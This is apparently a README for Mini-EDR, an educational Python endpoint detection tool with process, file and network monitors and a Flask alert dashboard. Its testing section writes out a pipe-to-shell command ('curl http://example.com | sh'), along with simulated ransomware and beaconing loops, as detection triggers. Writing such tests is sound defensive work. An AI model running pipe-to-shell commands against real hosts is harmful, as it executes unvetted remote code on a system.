 nb# ğŸ›¡ï¸ Mini-EDR â€“ Endpoint Detection & Response System

Mini-EDR is a **behavior-based Endpoint Detection & Response (EDR)** system built using Python.  
It monitors **process activity, file system behavior, and network traffic** to detect modern attack patterns in real time.

### ğŸ” What it Detects
- **Suspicious script execution** (e.g., pipe-to-shell attacks like `curl | sh`)
- **Ransomware-like behavior** (mass file creation or modification)
- **Possible C2 (Command & Control) activity** through repeated outbound network connections

The project also includes a **SOC-style web dashboard** that visualizes high-severity security alerts, helping analysts quickly identify and investigate incidents.


---

## ğŸ§± Project Structure

```text
mini-edr/
â”œâ”€â”€ agent/
â”‚   â”œâ”€â”€ process_monitor.py  # Detects malicious process behavior
â”‚   â”œâ”€â”€ file_monitor.py     # Detects ransomware-style file activity
â”‚   â””â”€â”€ network_monitor.py  # Detects C2-like network beaconing
â”œâ”€â”€ server/
â”‚   â”œâ”€â”€ detector.py         # Central detection & correlation engine
â”‚   â””â”€â”€ dashboard.py        # SOC-style Flask dashboard
â”œâ”€â”€ monitored_dir/          # Directory used for ransomware testing
â”œâ”€â”€ logs/
â”‚   â””â”€â”€ edr.log             # Central JSON event log
â”œâ”€â”€ start_edr.sh            # Service launcher script
â”œâ”€â”€ README.md
â”œâ”€â”€ .gitignore
â””â”€â”€ venv/                   # Python virtual environment

```

---

## ğŸ§  Architecture Overview

```text
[      Agent Layer      ]
   â”œâ”€ Process Monitor
   â”œâ”€ File Monitor
   â””â”€ Network Monitor
           â†“ (JSON Events)
    [ Central Log: edr.log ]
           â†“
    [  Detection Engine    ]
           â†“ (Alert Correlation)
    [    SOC Dashboard     ]

```

---

## âš™ï¸ Requirements

* **OS:** Linux (Tested on Debian / Kali / Ubuntu)
* **Language:** Python 3.9+
* **Privileges:** Root/Sudo may be required for certain network captures.

---

## ğŸ› ï¸ Installation

```bash

# Setup Virtual Environment
python3 -m venv venv
source venv/bin/activate

# Install Dependencies
pip install psutil watchdog flask requests

```

---

## ğŸ“ Important: Create `monitored_dir` (Required)

Before starting the **File Monitor**, you must create the directory
that will be monitored for ransomware-like activity.
````
mkdir -p monitored_dir
````

### â“ Why is this required?

* The file monitoring engine uses **Watchdog (inotify)** to observe filesystem changes.
* If the target directory does not exist, the monitor will crash with a `FileNotFoundError`.
* Creating `monitored_dir` ensures:

  * Stable startup
  * Correct ransomware detection
  * No runtime errors

This directory is intentionally kept separate so ransomware tests
do not affect real system files.
```
````
## ğŸ“ Important: Create `logs` Directory (Required)

The Mini-EDR uses a central log file to store all security events
generated by the agents and detection engine.
````
```
mkdir -p logs
touch logs/edr.log
```
````
### â“ Why is this required?

* All agents write events to a shared log file: `logs/edr.log`
* If the `logs` directory or log file does not exist, the system
  will fail to record security events.
* Creating the logs directory ensures:

  * Reliable event logging
  * Proper alert correlation by the detection engine
  * Accurate display of alerts on the SOC Dashboard

This design mimics real EDR systems, where a centralized log
is used for detection, correlation, and analysis.
```
```
## â–¶ï¸ How to Run (Step-by-Step)

Open separate terminal tabs for each component (ensure `venv` is active in each):

| Component | Command |
| --- | --- |
| **1. Process Monitor** | `python agent/process_monitor.py` |
| **2. File Monitor** | `python agent/file_monitor.py` |
| **3. Network Monitor** | `python agent/network_monitor.py` |
| **4. Detection Engine** | `python server/detector.py` |
| **5. SOC Dashboard** | `python server/dashboard.py` |

**Access the Dashboard:** Open your browser to [http://127.0.0.1:5001](http://127.0.0.1:5001)

---

## ğŸ§ª Testing Scenarios

### ğŸ§¨ 1. Ransomware Simulation (Mass File Modification)

```bash
cd monitored_dir
for i in {1..30}; do echo "encrypt" >> file$i.txt; done

```

* **Expected Result:** `HIGH` severity alert: "Possible ransomware behavior (mass file modification)".

### ğŸŒ 2. Network Detection (C2-like Behavior)

```bash
for i in {1..10}; do curl [http://example.com](http://example.com); done

```

* **Expected Result:** Network alert triggered for repeated outbound connections (beaconing).

### ğŸ§ª 3. Process-Based Attack

```bash
bash -c "curl [http://example.com](http://example.com) | sh"

```

* **Expected Result:** Process alert: "Script downloading from internet".

---

## ğŸš¨ Alert Classification

| Type | Description |
| --- | --- |
| **PROCESS** | Suspicious script execution or shell pipes. |
| **FILE** | Mass file modifications indicating encryption/data wiping. |
| **NETWORK** | High-frequency outbound traffic to external IPs. |

> **Note:** Only high-severity alerts are forwarded to the dashboard to reduce SOC fatigue and noise.

---

## ğŸ¥ Demo Video (YouTube)

ğŸ“º **Project Demo:**  
ğŸ‘‰ https://www.youtube.com/watch?v=YOUR_VIDEO_LINK_HERE

### ğŸ“Œ Demo Covers:
- Overall system architecture
- Live attack simulation (process, file & network)
- Real-time SOC dashboard alerts
- Detection logic & hardening approach


---

## ğŸ” Hardening Techniques Used

- **Alert deduplication**  
  Prevents repeated alerts for the same incident to reduce noise.

- **Cooldown-based detection**  
  Uses time-based thresholds to avoid multiple alerts from burst activity.

- **Allowlisting to reduce false positives**  
  Known benign processes, users, and IP patterns are excluded from detection.

- **Incident-level alerting**  
  Multiple low-level events are correlated into a single high-severity alert.

---

## âš ï¸ Limitations

- **User-space monitoring**  
  The system does not use kernel hooks (eBPF, LSM, or kernel modules).

- **Designed for learning & demonstration**  
  This project is intended for educational and portfolio purposes.

- **Not a replacement for enterprise EDR**  
  Lacks advanced features like kernel telemetry, ML models, and cloud-scale response.
